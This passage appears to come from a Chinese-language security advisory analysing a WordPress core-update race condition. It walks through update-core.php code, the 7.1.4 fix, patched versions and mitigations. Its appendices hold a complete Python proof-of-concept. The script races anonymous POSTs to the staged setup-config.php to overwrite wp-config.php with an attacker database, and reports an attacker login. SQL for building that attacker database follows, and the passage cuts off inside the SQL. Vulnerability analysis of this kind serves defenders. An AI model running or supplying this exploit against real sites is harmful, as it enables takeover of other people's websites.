);\n...\n2042: \tforeach ( (array) $dirlist as $filename =&gt; $fileinfo ) {\n2043: \t\tif ( in_array( $filename, $skip_list, true ) ) {\n2044: \t\t\tcontinue;</code></pre><p>它在复制开始时才 dirlist，而不是用原始包清单。解压之后、这一行之前被创建的文件，都会被当成“升级内容”。攻击者的 wp-config.php 就是在这一步进入清单的。那么攻击者写入和这一行之间，有多长时间，接着看</p><h3 id=\"sec-45\">14、窗口：checksums 的外网请求</h3><p>wp-admin/includes/update-core.php -&gt; update_core()</p><pre><code>1553: \tif ( function_exists( 'get_core_checksums' ) ) {\n1555: \t\t$working_dir_local = WP_CONTENT_DIR . '/upgrade/' . basename( $from ) . $distro;\n1557: \t\t$checksums = get_core_checksums( $wp_version, $wp_local_package ?? 'en_US' );</code></pre><p>在 copy_dir 之前，update_core 要先拉官方校验和。这是一次外网请求，几秒量级——正好把“解压完成”到“拍快照”之间的窗口撑开。攻击者的 POST 必须在这几秒内完成写入。</p><h3 id=\"sec-46\">15、完整总结</h3><p>三处代码分别是：</p><ul><li><p>目录名来自包名，本身是为了“可读、可复用”；</p></li><li><p>安装器接受 POST，本身是为了“全新安装”；</p></li><li><p>copy_dir 重新读目录，本身是为了“复制实际文件”。</p></li></ul><p>单独看都没写错。叠加起来：目录可预测 → 暂存目录可访问 → 安装器接受匿名输入 → 写入的文件被复制 → 正式配置被覆盖。</p><p>触发条件缺一不可：</p><ol><li><p>目标版本的 update-core.php 的 skip 不含 wp-config.php；</p></li><li><p>暂存目录名可预测（本地包，或官网带 Content-Disposition）；</p></li><li><p>暂存目录在 Web 根下且 PHP 可执行；</p></li><li><p>暂存树里没有 wp-config.php（升级包不带）；</p></li><li><p>受害机能连到攻击者数据库；</p></li><li><p>POST 落在 dirlist 之前。</p></li></ol><h3 id=\"sec-47\">16、对比：7.1.3 升 7.1.4 改了什么</h3><p>wp-admin/includes/update-core.php -&gt; update_core()（7.1.4）</p><pre><code>1548: \t * Never copy a wp-config.php, which could have been written to the working directory.\n1550: \t$skip              = array( 'wp-content', 'wp-includes/version.php', 'wp-config.php' );</code></pre><p>wp-admin/includes/class-wp-upgrader.php -&gt; unpack_package()（7.1.4）</p><pre><code>354: \tprivate function get_working_dir_name( $package ) {\n358: \t\treturn $name . '-' . wp_generate_password( 16, false );\n...\n404: \t\tif ( ! $wp_filesystem-&gt;exists( $upgrade_folder . 'index.php' ) ) {\n405: \t\t\t$wp_filesystem-&gt;put_contents( $upgrade_folder . 'index.php', \"&lt;?php\\n// Silence is golden.\\n\", FS_CHMOD_FILE );\n409: \t\t$working_dir = $upgrade_folder . $this-&gt;get_working_dir_name( $package );</code></pre><p>三处修复分别对应：目录名不可预测、upgrade 目录不可列、复制时排除 wp-config.php。</p><p>但要注意执行顺序：7.1.3 升 7.1.4 时，跑的还是 7.1.3 的 unpack_package，所以随机目录和 index.php 这两处这次并不生效；真正生效的是新包里的 update-core.php，它的 skip 把 wp-config.php 排除了。</p><h2 id=\"sec-48\">十、修复措施</h2><p>目前 WordPress 官方已发布安全更新，建议受影响用户尽快升级至对应修复版本：</p><p>WordPress 4.7.* &gt;= 4.7.39</p><p>WordPress 4.8.* &gt;= 4.8.34</p><p>WordPress 4.9.* &gt;= 4.9.35</p><p>WordPress 5.0.* &gt;= 5.0.31</p><p>WordPress 5.1.* &gt;= 5.1.28</p><p>WordPress 5.2.* &gt;= 5.2.30</p><p>WordPress 5.3.* &gt;= 5.3.27</p><p>WordPress 5.4.* &gt;= 5.4.25</p><p>WordPress 5.5.* &gt;= 5.5.24</p><p>WordPress 5.6.* &gt;= 5.6.23</p><p>WordPress 5.7.* &gt;= 5.7.21</p><p>WordPress 5.8.* &gt;= 5.8.19</p><p>WordPress 5.9.* &gt;= 5.9.20</p><p>WordPress 6.0.* &gt;= 6.0.18</p><p>WordPress 6.1.* &gt;= 6.1.16</p><p>WordPress 6.2.* &gt;= 6.2.15</p><p>WordPress 6.3.* &gt;= 6.3.14</p><p>WordPress 6.4.* &gt;= 6.4.14</p><p>WordPress 6.5.* &gt;= 6.5.14</p><p>WordPress 6.6.* &gt;= 6.6.11</p><p>WordPress 6.7.* &gt;= 6.7.11</p><p>WordPress 6.8.* &gt;= 6.8.12</p><p>WordPress 6.9.* &gt;= 6.9.11</p><p>WordPress 7.0.* &gt;= 7.0.8</p><p>WordPress 7.1.* &gt;= 7.1.4</p><p>站点管理员可通过 WordPress 后台进行升级，也可从 WordPress 官方渠道下载最新安装包进行手动更新。</p><p>若站点已开启自动更新，应确认核心版本已成功更新至修复版本。</p><p>官方公告地址：</p><p><a href=\"https://wordpress.org/news/2026/10/wordpress-7-1-4/\">https://wordpress.org/news/2026/10/wordpress-7-1-4/</a></p><p>临时缓解措施：</p><p>1.在升级前通过 Web 服务器配置（.htaccess、Nginx 规则等）拒绝对 /wp-content/upgrade/ 的 HTTP 访问。</p><p>2.使用 WAF /防火墙拦截对 setup-config.php 及 wp-content/upgrade 路径的异常请求。</p><h2 id=\"sec-49\">十一、参考链接</h2><p>1、<a href=\"https://xint.io/blog/wordpress-core-update-attack\">https://xint.io/blog/wordpress-core-update-attack</a></p><p>2、<a href=\"https://www.cve.org/CVERecord?id=CVE-2026-119977\">https://www.cve.org/CVERecord?id=CVE-2026-119977</a></p><h2 id=\"sec-50\">附录一</h2><p>POC如下:</p><pre><code>import argparse\nimport re\nimport time\nimport requests\n\ndef main():\n    ap = argparse.ArgumentParser()\n    ap.add_argument(\"--base\", default=\"http://wp712.com\")\n    ap.add_argument(\"--dir\", default=\"wordpress-7.1.3\")\n    ap.add_argument(\"--discover\", action=\"store_true\",\n                    help=\"resolve the staging dir from the directory listing\")\n    ap.add_argument(\"--dbname\", default=\"evil712\")\n    ap.add_argument(\"--dbuser\", default=\"evil\")\n    ap.add_argument(\"--dbpass\", default=\"evilpass\")\n    ap.add_argument(\"--dbhost\", default=\"127.0.0.1:3307\")\n    ap.add_argument(\"--prefix\", default=\"wp_\")\n    ap.add_argument(\"--duration\", type=int, default=240)\n    args = ap.parse_args()\n\n    session = requests.Session()\n    session.trust_env = False\n\n    staged_dir = args.dir\n    if args.discover:\n        listing = args.base + \"/wp-content/upgrade/\"\n        print(\"[*] waiting for the listing to reveal wordpress-7.1.3(-XXXXXX)/\")\n        end = time.time() + args.duration\n        while time.time() &lt; end:\n            try:\n                r = session.get(listing, timeout=5)\n                m = re.findall(\n                    r'href=\"(wordpress-7\\.1\\.3(?:-[A-Za-z0-9]{6})?)/\"', r.text\n                )\n                if m:\n                    staged_dir = m[0]\n                    break\n            except requests.RequestException:\n                pass\n            time.sleep(0.2)\n        else:\n            print(\"[-] staging directory never showed up in the listing\")\n            return 1\n        print(f\"[+] discovered {staged_dir}\")\n\n    url = (f\"{args.base}/wp-content/upgrade/{staged_dir}/wordpress\"\n           \"/wp-admin/setup-config.php?step=2&amp;noapi=1\")\n    data = {\n        \"dbname\": args.dbname, \"uname\": args.dbuser, \"pwd\": args.dbpass,\n        \"dbhost\": args.dbhost, \"prefix\": args.prefix,\n        \"noapi\": \"1\", \"language\": \"\",\n    }\n\n    print(f\"[*] target : {args.base}\")\n    print(f\"[*] staged : wp-content/upgrade/{staged_dir}/wordpress/\")\n    print(f\"[*] database: {args.dbname} @ {args.dbhost}\")\n    print(\"[*] anonymous POSTs; 404 until the upgrader creates the tree\")\n\n    t0 = time.time()\n    end = t0 + args.duration\n    attempts = 0\n    while time.time() &lt; end:\n        attempts += 1\n        resp = None\n        try:\n            resp = session.post(url, data=data, timeout=3)\n            body = resp.text\n        except requests.RequestException:\n            body = \"\"\n        if \"install.php\" in body:\n            print(f\"[+] config written after {attempts} POSTs \"\n                  f\"({time.time() - t0:.1f}s, HTTP {resp.status_code})\")\n            break\n        if attempts % 500 == 0:\n            code = resp.status_code if resp is not None else 0\n            print(f\"    ... {attempts} POSTs, last HTTP {code}\")\n        time.sleep(0.005)\n    else:\n        print(\"[-] no write before the deadline\")\n        return 1\n\n    print(\"[*] waiting for the upgrader to copy the staged wp-config.php\")\n    end = time.time() + 120\n    while time.time() &lt; end:\n        try:\n            check = session.get(args.base + \"/\", timeout=10)\n            if \"Evil Site\" in check.text:\n                print(\"[+] live site now uses the attacker database ('Evil Site')\")\n                print(\"[+] done: log in as attacker / Attacker#2026\")\n                return 0\n        except requests.RequestException:\n            pass\n        time.sleep(2)\n\n    print(\"[-] site never switched to the attacker database\")\n    return 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())</code></pre><h2 id=\"sec-51\">附录二</h2><p>攻击者建立数据库SQL语句:</p><pre><code>CREATE DATABASE IF NOT EXISTS evil712 CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci;\nCREATE USER IF NOT EXISTS 'evil'@'%' IDENTIFIED WITH mysql_native_password BY 'evilpass';\nGRANT ALL ON evil712.* TO 'evil'@'%';\nFLUSH PRIVILEGES;\nUSE evil712;\n\n/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;\n/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;\n/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;\n SET NAMES utf8 ;\n/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;\n/*!40103 SET TIME_ZONE='+00:00' */;\n/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;\n/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;\n/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;\nDROP TABLE IF EXISTS `wp_options`;\n/*!40101 SET @saved_cs_client     = @@character_set_client */;\n SET character_set_client = utf8mb4 ;\nCREATE TABLE `wp_options` (\n  `option_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,\n  `option_name` varchar(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL DEFAULT '',\n  `option_value` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL,\n  `autoload` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL DEFAULT 'yes',\n  PRIMARY KEY (`option_id`),\n  UNIQUE KEY `option_name` (`option_name`),\n  KEY `autoload` (`autoload`)\n) ENGINE=MyISAM AUTO_INCREMENT=197 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;\n/*!40101 SET character_set_client = @saved_cs_client */;\n\n-- 16 rows: siteurl/home must match the victim URL; wp_user_roles is required.\nLOCK TABLES `wp_options` WRITE;\n/*!40000 ALTER TABLE `wp_options` DISABLE KEYS */;\nINSERT INTO `wp_options` VALUES (2,'siteurl','http://wp712.com','on'),(3,'home','http://wp712.com','on'),(4,'blogname','Evil Site','on'),(5,'blogdescription','','on'),(6,'users_can_register','0','on'),(7,'admin_email','attacker@example.com','on'),(29,'permalink_structure','','on'),(32,'blog_charset','UTF-8','on'),(34,'active_plugins','a:0:{}','on'),(41,'template','twentytwentyfive','on'),(42,'stylesheet','twentytwentyfive','on'),(46,'default_role','subscriber','on'),(47,'db_version','61833','on'),(52,'show_on_front','posts','on'),(81,'timezone_string','','on'),(103,'wp_user_roles','a:5:{s:13:\\\"administrator\\\";a:2:{s:4:\\\"name\\\";s:13:\\\"Administrator\\\";s:12:\\\"capabilities\\\";a:61:{s:13:\\\"switch_themes\\\";b:1;s:11:\\\"edit_themes\\\";b:1;s:16:\\\"activate_plugins\\\";b:1;s:12:\\\"edit_plugins\\\";b:1;s:10:\\\"edit_users\\\";b:1;s:10:\\\"edit_files\\\";b:1;s:14:\\\"manage_options\\\";b:1;s:17:\\\"moderate_comments\\\";b:1;s:17:\\\"manage_categories\\\";b:1;s:12:\\\"manage_links\\\";b:1;s:12:\\\"upload_files\\\";b:1;s:6:\\\"import\\\";b:1;s:15:\\\"unfiltered_html\\\";b:1;s:10:\\\"edit_posts\\\";b:1;s:17:\\\"edit_others_posts\\\";b:1;s:20:\\\"edit_published_posts\\\";b:1;s:13:\\\"publish_posts\